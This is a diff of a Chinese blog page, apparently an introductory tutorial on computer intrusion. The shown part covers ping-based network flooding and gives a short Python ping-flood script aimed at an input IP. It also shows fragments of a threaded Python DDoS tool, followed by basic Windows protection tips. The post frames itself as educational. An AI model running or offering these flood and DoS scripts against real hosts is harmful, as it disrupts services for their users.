@@ -254,7 +254,6 @@
             <div class="markdown-body">
               <p>妙啊</p>
 <a id="more"></a>
-
 <h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>先明确本篇文章旨在让有意学习者了解计算机病毒入侵的手段和防护办法，请各位学习者自觉遵循中华人民共和国相关法律法规。  其次，如果认为“黑客是坏蛋”，建议先看看<a href="https://m.baidu.com/sf_bk/item/%E9%BB%91%E5%AE%A2/118396?ms=1&amp;rid=11053482354809685763" target="_blank" rel="noopener">黑客骇客谁是坏蛋？</a>  </p>
 <p>其实关于入侵技术的文章一直都是比较少，可能是因为现在国家企业对网络安全越来越重视了，越来越多的技术人员从事网络安全防护，病毒入侵也不似以前那么猖狂。  </p>
 <h1 id="计算机病毒介绍"><a href="#计算机病毒介绍" class="headerlink" title="计算机病毒介绍"></a>计算机病毒介绍</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>  狭义上的计算机病毒是指能够进行自我传播，需要用户敢于来触发执行的破坏性程序或代码。</p>
@@ -288,25 +287,18 @@
 <li>安装虚拟机并安装Windows系统镜像<br>攻击别人的电脑或网站犯法，所以自己搭建个虚拟机吧（说机不说吧，文明你我他）òᆺó<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203072&amp;idx=1&amp;sn=b21a1c1d4526cb578efa7aeb74f4d857&amp;chksm=8ee1432cb996ca3ae786c341458b2d52d9af516134975a43180d904e36c14253596f28be7996&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">安装VMware</a><br><a href="https://blog.csdn.net/qq3399013670/article/details/81937412" target="_blank" rel="noopener">安装VitrualBox</a><br>以上安装虚拟机方式任选其一，安装完成记得下载iso文件安装系统  </li>
 </ul>
 <h2 id="ping网络堵塞"><a href="#ping网络堵塞" class="headerlink" title="ping网络堵塞"></a>ping网络堵塞</h2><p>首先，需要获取攻击的ip地址（这个是最基本的，连没有ip地址都不知道，就啥也搞不了）。<br>Windows系统获得本机的ip地址只需要打开命令提示符（cmd）并输入ipconfig就可以了。但是攻击的时候需要目标的ip地址，这个时候就需要抓包工具啦。<br><a href="https://blog.csdn.net/gufenchen/article/details/90895856" target="_blank" rel="noopener">常用的几款抓包工具</a> ，找一个你觉得顺眼的工具用一下吧！（这里说一下，黑客的软件，不能随便下载，指不准在软件里做了手脚打包发出来的，所以尽量还是去可靠的渠道下载黑客工具吧，例如官网~）<br>如果是获取网站ip地址，直接打开cmd，ping一下域名就行了。<br><code>ping baidu.com</code>   </p>
-<center>如图，得到的   就是ip地址</center>
-在这里来个补充，ping一下ip，原理上是本机给对方ip地址发送请求，如果对方ip收到请求那么就给本机返回数据包~在这过程中对方ip地址对应的服务器（电脑）
-
+<p></p><center>如图，得到的   就是ip地址</center><br>在这里来个补充，ping一下ip，原理上是本机给对方ip地址发送请求，如果对方ip收到请求那么就给本机返回数据包~在这过程中对方ip地址对应的服务器（电脑）<p></p>
 <p>试想，如果一直发送会不会造成网络堵塞？<br>因此有了以下操作：  </p>
 <p>PING -t ip<br>注：这样可以PING指定的IP到永远，除非你停止它。很多初级黑客喜欢用这个参数来进行网络堵塞的攻击。<br>PING -l 大小 ip<br>注：这样可以设置发送包大小<br>PING -n 次数 ip<br>注：这样可以设置次数。 </p>
 <p><code>PING -n 10 -l 10 baidu.com</code> </p>
 <p>图</p>
-<p>利用ping造成网络堵塞的Python3.7代码</p>
-<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
+<p>利用ping造成网络堵塞的Python3.7代码<br></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
 <span class="hljs-keyword">import</span> socket
 <span class="hljs-keyword">import</span> time
 ip = input(<span class="hljs-string">"请输入IP："</span>)
-os.system(<span class="hljs-string">"ping -t -l 50 "</span> + ip)</code></pre></div>
-
-
-
+os.system(<span class="hljs-string">"ping -t -l 50 "</span> + ip)</code></pre></div><p></p>
 <h2 id="分布式拒绝服务攻击（DDos）"><a href="#分布式拒绝服务攻击（DDos）" class="headerlink" title="分布式拒绝服务攻击（DDos）"></a>分布式拒绝服务攻击（DDos）</h2><p>分布式拒绝服务攻击可以使很多的计算机在同一时间遭受到攻击，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
-<p>来看看Python3.7的DDos代码</p>
-<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
+<p>来看看Python3.7的DDos代码<br></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
 <span class="hljs-keyword">import</span> time
 <span class="hljs-keyword">import</span> threading
 <span class="hljs-comment">#Pressure Test,ddos tool</span>
@@ -358,8 +350,7 @@ conn_th=threading.Thread(target=conn_thread,args=())
 send_th=threading.Thread(target=send_thread,args=())
 
 conn_th.start()
-send_th.start()</code></pre></div>
-
+send_th.start()</code></pre></div><p></p>
 <h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><p>最简单最基础的网络攻击讲完了，那么接下来该学学学习如何保护自己的计算机啦(*σ´∀`)σ  </p>
 <ul>
 <li><p>如果是Win10，打开自带的Defender<br>傻瓜式设置，按照系统的提示把防火墙什么的都打开  </p>
